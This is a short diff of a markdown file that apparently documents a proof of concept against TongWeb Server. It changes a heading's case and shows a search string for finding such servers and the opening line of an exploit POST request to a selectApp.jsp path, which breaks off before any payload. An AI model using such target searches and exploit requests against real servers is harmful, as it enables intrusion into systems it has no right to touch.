@@ -5,7 +5,7 @@
 header="TongWeb Server" || banner="Server: TongWeb Server"
 ```
 
-## poc
+## POC
 ```
 POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
 Host: 
